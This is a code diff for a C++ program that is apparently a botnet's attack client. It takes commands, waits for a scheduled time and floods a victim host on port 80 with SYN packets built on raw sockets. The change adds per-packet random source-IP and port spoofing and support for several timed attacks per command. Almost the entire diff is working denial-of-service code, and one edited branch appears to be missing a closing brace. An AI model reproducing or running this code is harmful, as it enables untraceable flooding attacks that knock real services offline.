@@ -21,7 +21,7 @@ using namespace std;
 
 #define RANDOM_SPOOFING 1
 
-static int seed = 0xA0000000;
+static unsigned int seed = 0xA0000000;
 
 static int botNo;
 static int offset;
@@ -29,6 +29,7 @@ static int offset;
 
 unsigned short csum(unsigned short *,int);
 void parseCommand(char []);
+void ipSpoofing(string &sourceIP, int &sourcePort);
 void synAttack(string, int, string, int, int);
 
 void getOffset(){
@@ -100,6 +101,12 @@ void waitUntilTargettime(char* time){
     cout << "Start waiting for " << wait_usec << " usec." << endl;
     usleep(wait_usec);
 }
+
+int timeDur(char* ch)
+{
+    return ((ch[0]-'0')*1000 + (ch[1]-'0')*100 + (ch[2]-'0')*10 + (ch[3]-'0'));
+}
+
 int main(void)
 {
 	
@@ -163,25 +170,23 @@ void parseCommand(char command[])
     }
     else if (command[0] == '2')
     {
-        struct hostent *hostinfo = NULL; //Host name
-        char victim_ip[256];
-        cout << command << endl;
-        waitUntilTargettime(command+15);
-        hostinfo = gethostbyname(victim);
-        sprintf(victim_ip,"%s",inet_ntoa(*(struct in_addr *)*(hostinfo->h_addr_list)));
-        cout << victim_ip << endl;
-        
-        string ss="";
-        int port = 0;
-        /*int p1=rand()%256;
-        int p2=rand()%256;
-        int p3=rand()%256;
-        int p4=rand()%256;
-        int port=rand()%65536;*/
-        //string ss=to_string(p1)+"."+to_string(p2)+"."+to_string(p3)+"."+to_string(p4);
-        synAttack(ss, port, victim_ip, 80, 3);
-        //synAttack("192.168.1.2", 22000, victim_ip, 80, 3);
-        cout << "Done" << endl;
+    	srand(time(NULL));    // For random IP spoofing;
+        int attackNum = (strlen(command) - 15) / 19;
+        for (int i = 0; i < attackNum; i++)
+        {
+	        struct hostent *hostinfo = NULL; //Host name
+	        char victim_ip[256];
+	        cout << command << endl;
+	        waitUntilTargettime(command+15+i*19);
+	        hostinfo = gethostbyname(victim);
+	        sprintf(victim_ip,"%s",inet_ntoa(*(struct in_addr *)*(hostinfo->h_addr_list)));
+	        cout << victim_ip << endl;
+	        
+	        string ss="";
+	        int port = 0;
+	        synAttack(ss, port, victim_ip, 80, timeDur(command+15+15+i*19));
+	        //synAttack("192.168.1.2", 22000, victim_ip, 80, 3);
+	        cout << "Done" << endl;
     }
     else
         cout << "Wrong command!" << endl;
@@ -217,28 +222,6 @@ unsigned short csum(unsigned short *ptr,int nbytes)
 void synAttack(string sourceIP, int sourcePort, string destIP, int destPort, int durTime)
 {
 	// Create a raw socket;
-    
-    srand(time(NULL));
-    if (RANDOM_SPOOFING==0) {
-        seed+=4;
-        int p1=seed%256;
-        int p2=(seed>>8)%256;
-        int p3=(seed>>16)%256;
-        int p4=(seed>>24)%256;
-        sourcePort=rand()%65536;
-        sourceIP=to_string(p1)+"."+to_string(p2)+"."+to_string(p3)+"."+to_string(p4);
-
-    }else{
-    
-        int p1=rand()%256;
-        int p2=rand()%256;
-        int p3=rand()%256;
-        int p4=rand()%256;
-        sourcePort=rand()%65536;
-        sourceIP=to_string(p1)+"."+to_string(p2)+"."+to_string(p3)+"."+to_string(p4);
-    
-    }
-    
 	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
 
 	if(s == -1)
@@ -269,85 +252,132 @@ void synAttack(string sourceIP, int sourcePort, string destIP, int destPort, int
     data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
     strcpy(data, "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
 
-    // Some address resoluition;
-    strcpy(source_ip, sourceIP.c_str());  // Source IP
-    sin.sin_family = AF_INET;
-    sin.sin_port = htons(destPort);  // Destination port
-    sin.sin_addr.s_addr = inet_addr(destIP.c_str()); // Destination IP
-
-    // Fill in the IP Header;
-    iph->ihl = 5;
-    iph->version = 4;
-    iph->tos = 0;
-    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
-    iph->id = htonl(54321);  // Id of this packet;
-    iph->frag_off = 0;
-    iph->ttl = 255;
-    iph->protocol = IPPROTO_TCP;
-    iph->check = 0;
-    iph->saddr = inet_addr(source_ip);
-    iph->daddr = sin.sin_addr.s_addr;
-
-    // IP checksum;
-    iph->check = csum((unsigned short*)datagram, iph->tot_len);
-
-    // TCP Header;
-    tcph->source = htons(sourcePort);  // Source port;
-    tcph->dest = htons(destPort);  // Destination port;
-    tcph->seq = 0;
-    tcph->ack_seq = 0;
-    tcph->doff = 5;    // TCP header size;
-    tcph->fin = 0;
-    tcph->syn = 1;
-    tcph->rst = 0;
-    tcph->psh = 0;
-    tcph->ack = 0;
-    tcph->urg = 0;
-    tcph->window = htons(5840);  // Maximum allowed window size;
-    tcph->check = 0;
-    tcph->urg_ptr = 0;
-
-    // Pseudo header;
-    psh.source_address = inet_addr(source_ip);
-    psh.dest_address = sin.sin_addr.s_addr;
-    psh.placeholder = 0;
-    psh.protocol = IPPROTO_TCP;
-    psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));
-
-    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
-    pseudogram = (char*)malloc(psize);
-     
-    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
-    memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
-    
-    // TCP checksum;
-    tcph->check = csum( (unsigned short*) pseudogram , psize);
-
-    // IP_HDRINCL to tell the kernel that headers are included in the packet
-    int one = 1;
-    const int *val = &one;
-
-    if  (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
-    {
-    	cout << "Error in setting IP_HDRINCL" << endl;
-    	return;
-    }
-
-    // SYN flood;
+    // SYN Floor with IP Spoofing;
     time_t timeBegin = time(NULL);
-    while (1)
+    while(1)
     {
-    	// Send the packet;
-    	if (sendto (s, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
-    	{
-    		cout << "sendto failed!" << endl;
-    	}
-    	else
-    	{
-    		cout << "Packet sent!  Length : " << iph->tot_len << endl;
-    	}
+        // IP spoofing;
+        ipSpoofing(sourceIP, sourcePort);
 
-    	if (time(NULL) - timeBegin > durTime)
+        // Some address resoluition;
+        strcpy(source_ip, sourceIP.c_str());  // Source IP
+        sin.sin_family = AF_INET;
+        sin.sin_port = htons(destPort);  // Destination port
+        sin.sin_addr.s_addr = inet_addr(destIP.c_str()); // Destination IP
+
+        // Fill in the IP Header;
+        iph->ihl = 5;
+        iph->version = 4;
+        iph->tos = 0;
+        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
+        iph->id = htonl(54321);  // Id of this packet;
+        iph->frag_off = 0;
+        iph->ttl = 255;
+        iph->protocol = IPPROTO_TCP;
+        iph->check = 0;
+        iph->saddr = inet_addr(source_ip);
+        iph->daddr = sin.sin_addr.s_addr;
+
+        // IP checksum;
+        iph->check = csum((unsigned short*)datagram, iph->tot_len);
+
+        // TCP Header;
+        tcph->source = htons(sourcePort);  // Source port;
+        tcph->dest = htons(destPort);  // Destination port;
+        tcph->seq = 0;
+        tcph->ack_seq = 0;
+        tcph->doff = 5;    // TCP header size;
+        tcph->fin = 0;
+        tcph->syn = 1;
+        tcph->rst = 0;
+        tcph->psh = 0;
+        tcph->ack = 0;
+        tcph->urg = 0;
+        tcph->window = htons(5840);  // Maximum allowed window size;
+        tcph->check = 0;
+        tcph->urg_ptr = 0;
+
+        // Pseudo header;
+        psh.source_address = inet_addr(source_ip);
+        psh.dest_address = sin.sin_addr.s_addr;
+        psh.placeholder = 0;
+        psh.protocol = IPPROTO_TCP;
+        psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));
+
+        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
+        pseudogram = (char*)malloc(psize);
+         
+        memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
+        memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
+        
+        // TCP checksum;
+        tcph->check = csum( (unsigned short*) pseudogram , psize);
+
+        // IP_HDRINCL to tell the kernel that headers are included in the packet
+        int one = 1;
+        const int *val = &one;
+
+        if  (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
+        {
+        	cout << "Error in setting IP_HDRINCL" << endl;
+        	return;
+        }
+
+        // Send the packet;
+        if (sendto (s, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
+        {
+        	cout << "sendto failed!" << endl;
+        }
+        else
+        {
+        	cout << "Packet sent! Length : " << iph->tot_len;
+            cout << " Source IP: " << sourceIP << " Port: " << sourcePort << endl;
+        }
+
+        if (time(NULL) - timeBegin > durTime)
             break;
     }
+
+    close(s);
+}
+
+void ipSpoofing(string & sourceIP, int & sourcePort)
+{
+    int p1;
+    int p2;
+    int p3;
+    int p4;
+    char str1[5];
+    char str2[5];
+    char str3[5];
+    char str4[5];
+
+    if (RANDOM_SPOOFING==0)
+    {
+        seed+=4;
+        p1=seed&0xFF;
+        p2=(seed>>8)&0xFF;
+        p3=(seed>>16)&0xFF;
+        p4=(seed>>24)&0xFF;
+    }
+    else
+    {
+        p1=rand()%256;
+        p2=rand()%256;
+        p3=rand()%256;
+        p4=rand()%256;
+    }
+
+    sprintf(str1, "%d", p1);
+    sprintf(str2, "%d", p2);
+    sprintf(str3, "%d", p3);
+    sprintf(str4, "%d", p4);
+    sourcePort=rand()%65536;
+    sourceIP = str1;
+    sourceIP += ".";
+    sourceIP += str2;
+    sourceIP += ".";
+    sourceIP += str3;
+    sourceIP += ".";
+    sourceIP += str4;
 }
